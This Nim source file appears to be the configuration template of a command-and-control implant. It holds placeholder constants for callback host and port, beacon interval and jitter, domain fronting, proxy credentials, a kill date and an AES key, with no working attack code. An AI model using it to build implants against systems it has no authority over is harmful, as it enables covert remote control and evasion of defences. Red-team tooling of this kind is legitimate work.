## config.nim
## Configuration template - placeholders will be replaced during build

# Agent UUID
const PAYLOAD_UUID* = "%PAYLOAD_UUID%"

# C2 Profile Selection
const C2_PROFILE* = "%C2_PROFILE%"

# Common Configuration
const CHUNK_SIZE* = %CHUNK_SIZE%
const DEFAULT_PROXY* = %DEFAULT_PROXY%

# HTTPX Profile Configuration
when defined(HTTPX_PROFILE):
  const CALLBACK_HOST* = "%CALLBACK_HOST%"
  const CALLBACK_PORT* = %CALLBACK_PORT%
  const CALLBACK_INTERVAL* = %CALLBACK_INTERVAL%
  const CALLBACK_JITTER* = %CALLBACK_JITTER%
  const GET_URI* = "%GET_URI%"
  const POST_URI* = "%POST_URI%"
  const QUERY_PATH_NAME* = "%QUERY_PATH_NAME%"
  const DOMAIN_FRONT* = "%DOMAIN_FRONT%"
  const ENCRYPTED_EXCHANGE_CHECK* = %ENCRYPTED_EXCHANGE_CHECK%
  const HEADERS* = """%HEADERS%"""
  
  # Proxy Configuration
  const PROXY_HOST* = "%PROXY_HOST%"
  const PROXY_PORT* = "%PROXY_PORT%"
  const PROXY_USER* = "%PROXY_USER%"
  const PROXY_PASS* = "%PROXY_PASS%"
  
  # Killdate
  const KILLDATE* = "%KILLDATE%"

# HTTP Profile Configuration (standard)
when defined(HTTP_PROFILE):
  const CALLBACK_HOST* = "%CALLBACK_HOST%"
  const CALLBACK_PORT* = %CALLBACK_PORT%
  const CALLBACK_INTERVAL* = %CALLBACK_INTERVAL%
  const CALLBACK_JITTER* = %CALLBACK_JITTER%

# AES Encryption Key (if provided)
when defined(AESPSK):
  const AESPSK* = "%AESPSK%"
